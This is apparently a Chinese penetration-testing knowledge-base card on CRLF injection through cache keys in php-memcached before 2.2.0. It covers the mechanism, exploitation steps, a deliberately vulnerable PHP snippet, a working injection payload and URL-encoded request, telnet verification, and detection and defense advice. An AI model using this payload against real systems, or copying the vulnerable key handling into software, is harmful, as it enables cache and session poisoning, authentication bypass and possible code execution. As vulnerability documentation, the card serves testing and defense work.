---
id: web-generic-crlf-php-memcached-key-injection
title: php-memcached <2.2.0 键名 CRLF 注入：用户可控 key 拼进 Memcached 文本协议，NUL 截断 + 换行注入 set 篡改缓存
type: scenario
domain: web
path: web/generic/crlf
technique: php-memcached-key-crlf-protocol-injection
tags:
- web
- php
- memcached
- crlf
- protocol-injection
- cache-poisoning
- session
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: < 2.2.0
verification:
  verified_by: verifier-V545
  verified_at: '2026-11-11T20:57:15+08:00'
  notes: '已对照原文与图01-15核对：漏洞环境明确标注 php-memcached <2.2.0（原文“漏洞环境: <2.2.0”），affected_versions=< 2.2.0 与原文一致并用set-versions再确认；漏洞PHP（token直接进get key）、注入payload monkey%00%0D%0Aset allbmonkey 0 500 3%0D%0Acat、telnet set/get 验证（图01/02）、ThinkPHP cache Memcached 配置（图04/05/07）、admin序列化缓存注入 flags=4 101字节（图11/12）、secure_file_priv为空+load_file（图13/14/15）均与正文一致。修正项：一句话示例key由attacker对齐为原文allbmonkey；“2.2.0起对key做校验/过滤”改为原文可支撑的“原文把漏洞环境标注为<2.2.0（即2.2.0起已修复）”。dedup首位为 web-php-deserialization-thinkphp-memcached-crlf-session-poison-pivot-system-rce（related）：该卡是同一原语的ThinkPHP应用链+POP RCE，本卡是扩展层通用协议注入原语+版本边界+telnet验证，层次不同非同链，保留两张；其与其他CRLF/Redis协议注入卡均非同链。未在真实PHP环境复现注入。'
url: /docs/web/generic/crlf/web-generic-crlf-php-memcached-key-injection/
draft: false
kb_aliases:
- php-memcached CRLF
- Memcached 键名注入
- Memcached 协议注入
- token 缓存键注入
- Memcached set 命令注入
- php-memcached 2.2.0
---

## 一句话结论

php-memcached 扩展在 2.2.0 之前把用户提供的 key 原样拼进 Memcached 的文本行协议命令，未过滤 NUL/CR/LF；当应用执行 `$m->get($userInput)` 时，传入 `monkey%00%0D%0Aset allbmonkey 0 500 3%0D%0Acat`，扩展实际发出的命令流里 `%00` 截断原 get 参数、`\r\n` 开启一条新的 `set` 命令，于是攻击者可以向 Memcached 写入任意键值（缓存/Session 投毒），常见后果是登录态伪造或缓存数据篡改。

## 原理

- **Memcached 是纯文本行协议**：`get <key>\r\n`、`set <key> <flags> <exptime> <bytes>\r\n<value>\r\n`，服务端按行解析，`\r\n` 即命令边界。
- **扩展层缺少 key 校验**：php-memcached <2.2.0 在构造命令时直接把 PHP 字符串 key 追加到 `get ` 之后，不检查其中是否含 `\r`、`\n`、`\x00`。攻击者 key 里的换行让 Memcached 认为 get 行结束，后续内容被当作新命令执行。
- **NUL 的作用**：`%00` 用于让前半段“合法 key + 用户输入”在协议/字符串处理层面被截断，确保注入的 `set` 行从干净的起点开始（例如 key 前缀含空格/特殊字符时，NUL 可避免解析歧义；原文 payload 为 `monkey%00%0D%0Aset allbmonkey 0 500 3%0D%0Acat`）。
- **为什么能篡改缓存**：Memcached 无认证、无命名空间隔离，同一个实例上的任意键都可被 set 覆盖；应用若把 Session、登录用户、配置等放在缓存里，写入伪造值即可影响业务（如把 `think:shop.admin|admin` 覆盖成管理员序列化数组）。
- **修复**：原文把漏洞环境标注为 php-memcached <2.2.0（即 2.2.0 起已修复该问题）；应用侧也可对 key 做 `preg_replace('/\s+/m', '', mb_substr($key, 0, 250))` 之类的清洗。
- **危害边界**：单独看是协议注入/缓存篡改；结合具体应用可升级为认证绕过（缓存用户记录）或反序列化 RCE（缓存驱动 unserialize），因此按 high 评估。

## 触发条件

- 目标使用 php-memcached 扩展且版本 < 2.2.0。
- 应用把用户可控输入（token、session id、用户名、URL 参数）直接作为 key 传给 `get/set/add/replace/delete` 等方法。
- Memcached 服务可被应用访问（通常内网/本机，无 SASL 认证）。
- 攻击者能控制该输入（GET/POST 参数、Cookie、Header）。
- 仅用于授权测试。

## 利用步骤

1. 确认环境：PHP 使用 Memcached 扩展，应用将参数作为缓存 key（如 `$server->get("$token")`），版本 <2.2.0。
2. 先手工验证协议：`telnet <memcached> 11211`，执行 `set monkey 0 100 4` + `ckok` 看到 `STORED`，`get monkey` 看到值。
3. 构造注入 key：`monkey%00%0D%0Aset <目标key> <flags> <exptime> <bytes>%0D%0A<value>`，通过应用参数提交（URL 编码）。
4. 观察应用日志/行为确认 get 后多执行了 set；用 telnet `get <目标key>` 验证值已被写入。
5. 按业务构造恶意 value：若是 Session/用户缓存且驱动会 unserialize，写入伪造的用户数组/序列化对象（flags 需与类型匹配，如 PHP 数组用 flags=4）；若是普通字符串缓存，写入篡改后的配置/计数。
6. 触发业务读取该 key（重新登录、刷新页面、命中缓存），验证认证绕过/数据篡改；评估能否进一步 RCE（反序列化 POP 链）。

## PoC

```php
<?php
// 漏洞应用示例：token 直接作为 key
$server = new \Memcached();
$server->addServer('localhost', 11211);
$token = $_GET['token'];
$server->set("wolf", "poc");
echo "[token] = ";
var_dump($server->get("$token"));   // 用户可控 key -> 协议注入
echo "[wolf] = ";
var_dump($server->get("wolf"));
```

```text
# 注入 payload（URL 编码前）
token=monkey\x00\r\nset allbmonkey 0 500 3\r\ncat

# 扩展实际发出的命令流（等价于）
get monkey\x00
set allbmonkey 0 500 3
cat

# 请求示例（URL 编码）
GET /index.php?token=monkey%00%0D%0Aset%20allbmonkey%200%20500%203%0D%0Acat
```

```text
# 验证（telnet）
set monkey 0 100 4
ckok
STORED
get monkey
VALUE monkey 0 4
ckok
END
```

## 变体与关联

- 变体：注入点可能是 session id、用户名、URL 等任何进 key 的输入；命令可为 `set/add/replace/delete/incr/decr`，实现覆盖、删除或计数篡改。
- 变体：flags 决定 PHP 客户端反序列化类型（如 0 字符串、4 数组），构造序列化对象时需匹配；不同客户端对 flags 的解释可能不同。
- 变体：其他语言的 Memcached 客户端（pymemcache、python-memcached、libmemcached 封装）若未校验 key，同样存在协议注入；Memcached 本身无认证，暴露即高危。
- 关联：[[web-php-deserialization-thinkphp-memcached-crlf-session-poison-pivot-system-rce]]（ThinkPHP 会话键 CRLF 注入 + 反序列化 POP 链 RCE，本篇的应用化升级路径）、[[web-generic-crlf-redis-resp-length-shift-waf-bypass-role-escalation]]（同类存储协议注入）、[[web-php-deserialization-simplepie-memcache-poisoning]]（缓存投毒到反序列化）。

## 检测与防御

- 检测：审计代码中把用户输入直接传给 Memcached 客户端的位置；监控缓存键中出现 `%00`、`\r`、`\n`、空格、长键；Memcached 侧开启 `stats`/日志观察异常 set、异常键名；WAF 对参数中的 `%00%0D%0A` 组合告警。
- 防御：升级 php-memcached 到 >=2.2.0（并升级其他客户端到含 key 校验的版本）；应用侧对 key 做白名单/字符过滤（移除 `\s`、`\x00`，限制长度 ~250 字节）；不同业务用不同 Memcached 实例/前缀并禁止跨业务键；Memcached 仅监听内网、防火墙限制来源、启用 SASL（如支持）；缓存 value 若反序列化，避免使用不可信来源的对象。
- 说明：本文是 php-memcached 扩展的键名 CRLF 协议注入场景（原文标注受影响版本 <2.2.0），severity high（可篡改缓存并升级为认证绕过/RCE）；仅用于授权测试。
